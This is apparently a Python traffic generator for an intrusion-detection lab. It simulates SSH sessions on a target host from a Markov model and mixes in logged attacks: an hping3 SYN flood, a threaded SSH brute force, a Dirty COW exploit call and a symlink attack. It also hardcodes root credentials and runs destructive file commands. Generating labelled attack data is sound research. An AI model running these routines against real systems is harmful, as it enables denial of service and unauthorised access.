import paramiko
import random
import uuid
import time
import os
import prof
import numpy 
import statistics
import subprocess
from datetime import datetime
from threading import Thread
erd_cmds = ["cat","head","tail","file"]
ewr_cmds = ["cp","mv","echo \"Test string\" >","echo \"Test string\" >>","echo \"Test string\" | tee","touch"]
eed_cmds = ["sed -i 's/.*/Content has been removed./g'", "tr -s [:space:] <","rm","chmod +x"]
esrch_mv_cmds = ["cd", "ls","la","which", "whereis", "grep .*", "find / -name","pwd"]
# Other executable commands
exe_cmds = ["clear","ping google.com -c 1","ip a","ps", "ss", "jobs"]
# The following values have been pulled from the raw data, which cannot be made publicly available.
transition_matrix =  [
    [30.985915492957744, 1.056338028169014, 6.690140845070422, 38.028169014084504, 23.239436619718308], 
    [2.4242424242424243, 39.696969696969695, 3.939393939393939, 30.303030303030305, 23.636363636363637], 
    [3.864734299516908, 2.4154589371980677, 26.08695652173913, 44.20289855072464, 23.42995169082126], 
    [5.339578454332552, 4.496487119437939, 9.695550351288055, 58.922716627634664, 21.54566744730679], 
    [3.1161473087818696, 4.645892351274788, 3.6260623229461753, 27.138810198300284, 61.47308781869688]
]
session_lens = [482, 63, 37, 233, 176, 2, 553, 2, 45, 16, 9, 4, 8, 12, 2, 6, 3, 12, 5, 10, 2, 1, 18, 4, 53, 14, 22, 188, 47, 72, 1, 2, 86, 7, 3, 13, 3, 5, 26, 2, 524, 4, 2, 1, 1, 5, 196, 5, 6, 54, 1, 2, 147, 3, 2, 8, 6, 4, 94, 14, 3, 1, 12, 2, 1, 2, 58, 2, 18, 22, 213, 2, 1, 9, 31, 126, 25, 2, 2, 2, 1, 12, 1, 26, 12, 40, 99, 10, 3, 78, 45, 3, 8, 2, 1, 21]
states = {"read":0,"write":1,"edit":2,"search":3,"exe":4}
first_actions = [3.0927835051546393, 0.0, 6.185567010309279, 55.670103092783506, 35.051546391752574]
general_distributions = [5.321610365571495, 7.380842202683943, 7.7279037482646915, 44.863489125404904, 34.706154558074964]
class SSHClient: 
    def __init__(self): 
        self.host = os.environ.get('IP')
        self.username = "root"
        self.password = "test"
        self.limit = self.sample_session_len()

        # self.probs = prof.make_weights()
        self.count = 0
        self.probs = [7.565941693660343, 11.938917167977788, 20.43035631652013, 29.40768162887552, 30.65710319296622]
        self.client = paramiko.client.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.client.connect(self.host, username=self.username, password=self.password, port=30002)
        self.options = [self.write_file,self.read_file,self.edit_file,self.search_mv,self.exec_cmd]

    def sample_session_len(self): 
        return int(abs(numpy.random.normal(loc=statistics.mean(session_lens),scale=statistics.stdev(session_lens))))

    def run_command(self, cmd):
        _stdin, _stdout,_stderr = self.client.exec_command(cmd)
        out = _stdout.read().decode()
        return _stdin, out, _stderr.read().decode()

    def get_next(self,state):
        return random.choices(self.options, weights=transition_matrix[state],k=1)[0]

    def get_random(self): 
        _,out,_ = self.run_command("ls /tmp/`ls /tmp | sort -R | head -n 1`")
        ret = out.strip()
        if ret == "":
            print("No files")
            self.run_command("echo \"Test string\" >> "+self.make_random_fname())
        return ret
    
    def make_random_fname(self): 
        return  "/tmp/" + str(uuid.uuid4()) 

    def run_action(self,func):
        self.count += 1
        print("running action ", func)
        if (self.count < self.limit):
            time.sleep(random.randint(0,5))
            print("Action number",self.count," ->",func)
            func()
        else:
            print("Reached session limit")
            self.exit()
            return

    def write_file(self):
        state = states["read"]
        rcmd = random.choice(ewr_cmds)
        if rcmd == "cp" or rcmd == "mv":
            rcmd += " " + self.get_random() + " " + self.make_random_fname()
        else: 
            rcmd += " " + self.make_random_fname()
        self.run_command(rcmd)
        print(rcmd)
        next_action = self.get_next(state)
        self.run_action(next_action)

    def read_file(self):
        state = states["read"]
        rcmd = random.choice(erd_cmds) + " " + self.get_random()
        # print(rcmd)
        self.run_command(rcmd)
        print(rcmd)
        next_action = self.get_next(state)
        self.run_action(next_action)    

    def exec_cmd(self): 
        state = states["exe"]
        rcmd = random.choice(exe_cmds)
        self.run_command(rcmd)
        print(rcmd)
        next_action = self.get_next(state)
        self.run_action(next_action)

    def edit_file(self): 
        state = states["edit"]
        rcmd = random.choice(eed_cmds) + " " + self.get_random()
        # print("RCMD is " ,rcmd)
        self.run_command(rcmd)
        print(rcmd)
        next_action = self.get_next(state)
        self.run_action(next_action)

    def search_mv(self): 
        state = states["search"]
        rcmd = random.choice(esrch_mv_cmds) 
        if rcmd == "cd":
            rcmd = "cd .."
        else: 
            print("adding")
            rcmd = rcmd + " " + self.get_random()
            print(rcmd + " " + self.get_random())
        # print(rcmd)
        self.run_command(rcmd)
        print(rcmd)
        next_action = self.get_next(state)
        self.run_action(next_action)

    def exit(self):
        self.count = 0
        self.run_command("exit") 
        self.client.close()

    def simulate_one_action(self, probs = [0.2,0.2,0.2,0.2,0.2]):
        probs = self.probs
        res = random.choices(self.options, weights=probs, k=1)
        print(res)
        res[0]()

    def simulate_x(self,num):
        for i in range(num): 
            self.simulate_one_action()

    def simulate_for_x(self,secs):
        start_time = time.time()
        while (time.time() - start_time < secs):
            self.simulate_one_action()
            continue
        print(time.time() - start_time, "elapsed.")
    
    def simulate_session(self): 
        # self.simulate_x(num)
        self.limit = abs(numpy.random.normal(loc=statistics.mean(session_lens),scale=statistics.stdev(session_lens)))
        self.client = paramiko.client.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.client.connect(self.host, username=self.username, password=self.password, port=30002)
        first = random.choices(self.options,weights=first_actions)[0]
        first()
        time.sleep(random.randint(0,120))

    def _bruteforce_thread(self): 
        try:
            client = paramiko.client.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.host, username=self.username, password="wrong password", port=30002)
        except Exception as e: 
            print("Failed e")
            client.close()

    def run_flood(self,f): 
        f.write("Ran malicious DoS at " +  datetime.now().strftime("%d/%m/%Y %H:%M:%S:%f") + "\n")
        pswd = os.environ["spass"] 
        proc = subprocess.Popen(['sudo', '-S', 'timeout',"10","hping3","-S",os.environ["IP"],"-p","30002","--flood"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate(input=pswd.encode('utf-8'))
        print(proc)

    def run_bruteforce(self,f): 
        f.write("Ran malicious Brute Force at " +  datetime.now().strftime("%d/%m/%Y %H:%M:%S:%f") + "\n")
        self.exit()
        start_time = time.time()
        trs = []
        while (time.time() - start_time < 10):
            tr = Thread(target=self._bruteforce_thread)
            trs.append(tr)
            tr.start()
        print("No more threads")
        for thread in trs: 
            thread.join()

    def run_cve(self,f): 
        # Add logic
        f.write("Ran malicious Dirty COW at " +  datetime.now().strftime("%d/%m/%Y %H:%M:%S:%f") + "\n")
        _,out,e = self.run_command("timeout 1 /var/run/sshd/exploits/dirty /var/run/sshd/exploits/foo m00000000000000000")
        print(out, e)

    def run_internal(self,f):
        # Add logic - could run symlink
        f.write("Ran malicious Symlink Attack at " +  datetime.now().strftime("%d/%m/%Y %H:%M:%S:%f") + "\n")
        _,out,e = self.run_command("ln -s " + self.get_random() + " " + self.make_random_fname())
        print(out, e)


    def run_malicious(self,atk_type = ''): 
        file = 'malicious.log'
        if os.environ.get('outfile'): 
            file = os.environ.get('outfile')
        with open(file,'a') as f:
            if atk_type == 'f': 
                self.run_flood(f)
            elif atk_type == "b":
                self.run_bruteforce(f)
            elif atk_type == "c": 
                self.run_cve(f)
            elif atk_type == "s": 
                self.run_internal(f)

    def add_malicious(self,atk=None):
        try:
            if random.random() < 0.7: 
                choices = ["f","b","c","s"]
                chosen_atk = random.choice(choices)
                if atk is not None and atk in choices:
                    chosen_atk = atk
                print("Chose",chosen_atk)
                self.client = paramiko.client.SSHClient()
                self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                self.client.connect(self.host, username=self.username, password=self.password, port=30002)
                self.run_malicious(atk_type=chosen_atk)
            else: 
                self.simulate_session()
        except Exception as e: 
            print("Something went wrong in malicious:", e)
        time.sleep(random.randint(60,90))



def main(): 
    if os.environ.get('IP') == None or os.environ.get('spass') == None: 
        print("$IP not set. Set to the IP of the remote host and rerun.")
    client = SSHClient()
    for i in range(5): 
        # client.add_malicious()
        client.simulate_session()
    while True: 
        client.add_malicious()

    # client.run_command("ls -al")
    # client.run_command("for i in {0..5}; do echo $i; done")
    # client.edit_file()
    # client.simulate_x(5)
    # client.simulate_one_action()
    # client.simulate_for_x(5)
    # print(client.get_random())
    


if __name__ == "__main__": 
    main()